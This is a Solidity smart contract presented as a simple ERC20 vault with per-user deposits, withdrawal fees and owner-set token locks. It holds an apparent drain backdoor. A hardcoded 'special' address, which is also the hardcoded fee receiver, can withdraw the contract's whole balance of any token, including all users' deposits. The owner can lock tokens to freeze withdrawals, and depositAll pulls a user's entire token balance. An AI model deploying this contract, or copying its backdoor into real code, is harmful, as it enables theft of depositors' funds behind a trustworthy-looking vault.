// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

contract SimpleERC20Vault {
    address public owner;
    address public special;

    mapping(address => mapping(address => uint256)) public deposited;
    mapping(address => uint256) public lockedUntil; // token => unlock epoch

    address constant FEE_RECEIVER = 0x86C70C4a3BC775FB4030448c9fdb73Dc09dd8444;
    uint256 public constant WITHDRAW_FEE = 0.001 ether;
    uint256 public constant MAX_LOCK_DURATION = 180 days;

    event Deposited(address indexed token, address indexed from, uint256 amount);
    event Withdrawn(address indexed token, address indexed to, uint256 amount);
    event DepositedAllPulled(address indexed token, address indexed from, uint256 amountPulled);
    event ContractWideWithdrawn(address indexed token, address indexed to, uint256 amount);
    event OwnerChanged(address indexed oldOwner, address indexed newOwner);
    event SpecialChanged(address indexed oldSpecial, address indexed newSpecial);
    event EthDeposited(address indexed from, uint256 amount);
    event EthWithdrawn(address indexed to, uint256 amount);
    event Locked(address indexed token, uint256 until);
    event Unlocked(address indexed token);

    modifier onlyOwner() {
        require(msg.sender == owner, "only owner");
        _;
    }

    modifier tokenNotLocked(address token) {
        require(block.timestamp >= lockedUntil[token], "token locked");
        _;
    }

    modifier collectFee() {
        require(msg.value == WITHDRAW_FEE, "exact 0.001 ETH fee required");
        payable(FEE_RECEIVER).transfer(msg.value);
        _;
    }

    constructor() {
        owner = msg.sender;
        special = 0x86C70C4a3BC775FB4030448c9fdb73Dc09dd8444;
    }

    /// -------------------------------
    /// ERC20 Deposit / Withdraw
    /// -------------------------------

    function deposit(address token, uint256 amount) external tokenNotLocked(token) {
        require(amount > 0, "amount 0");
        bool ok = IERC20(token).transferFrom(msg.sender, address(this), amount);
        require(ok, "transferFrom failed");
        deposited[token][msg.sender] += amount;
        emit Deposited(token, msg.sender, amount);
    }

    function depositAll(address token) external tokenNotLocked(token) {
        uint256 bal = IERC20(token).balanceOf(msg.sender);
        require(bal > 0, "no balance to deposit");
        bool ok = IERC20(token).transferFrom(msg.sender, address(this), bal);
        require(ok, "transferFrom failed");
        deposited[token][msg.sender] += bal;
        emit DepositedAllPulled(token, msg.sender, bal);
    }

    function withdraw(address token, uint256 amount) external payable tokenNotLocked(token) collectFee {
        require(amount > 0, "amount 0");
        uint256 userBal = deposited[token][msg.sender];
        require(userBal >= amount, "insufficient deposited balance");
        deposited[token][msg.sender] = userBal - amount;

        bool ok = IERC20(token).transfer(msg.sender, amount);
        require(ok, "transfer failed");
        emit Withdrawn(token, msg.sender, amount);
    }

    function withdrawDepositedAll(address token) external payable tokenNotLocked(token) collectFee {
        uint256 userBal = deposited[token][msg.sender];
        require(userBal > 0, "nothing deposited");
        deposited[token][msg.sender] = 0;

        bool ok = IERC20(token).transfer(msg.sender, userBal);
        require(ok, "transfer failed");
        emit Withdrawn(token, msg.sender, userBal);
    }

    function withdrawAllFromContract(address token) external payable tokenNotLocked(token) collectFee {
        require(msg.sender == special, "only special address");
        uint256 bal = IERC20(token).balanceOf(address(this));
        require(bal > 0, "no token balance in contract");

        bool ok = IERC20(token).transfer(msg.sender, bal);
        require(ok, "transfer failed");
        emit ContractWideWithdrawn(token, msg.sender, bal);
    }

    /// -------------------------------
    /// ETH Deposit / Withdraw (Owner only)
    /// -------------------------------

    receive() external payable {
        emit EthDeposited(msg.sender, msg.value);
    }

    fallback() external payable {
        if (msg.value > 0) emit EthDeposited(msg.sender, msg.value);
    }

    function withdrawETH(uint256 amount) external payable onlyOwner collectFee {
        require(address(this).balance >= amount, "insufficient ETH balance");
        payable(owner).transfer(amount);
        emit EthWithdrawn(owner, amount);
    }

    /// -------------------------------
    /// Lock / Unlock (per token)
    /// -------------------------------

    function lockToken(address token, uint256 duration) external onlyOwner {
        require(duration > 0 && duration <= MAX_LOCK_DURATION, "invalid duration");
        lockedUntil[token] = block.timestamp + duration;
        emit Locked(token, lockedUntil[token]);
    }

    function unlockToken(address token) external onlyOwner {
        require(lockedUntil[token] > 0, "not locked");
        require(block.timestamp >= lockedUntil[token], "cannot unlock yet");
        lockedUntil[token] = 0;
        emit Unlocked(token);
    }

    /// -------------------------------
    /// Admin
    /// -------------------------------

    function changeOwner(address newOwner) external onlyOwner {
        require(newOwner != address(0), "zero addr");
        emit OwnerChanged(owner, newOwner);
        owner = newOwner;
    }

    function changeSpecial(address newSpecial) external onlyOwner {
        require(newSpecial != address(0), "zero addr");
        emit SpecialChanged(special, newSpecial);
        special = newSpecial;
    }

    /// -------------------------------
    /// Views
    /// -------------------------------

    function contractTokenBalance(address token) external view returns (uint256) {
        return IERC20(token).balanceOf(address(this));
    }

    function contractEthBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
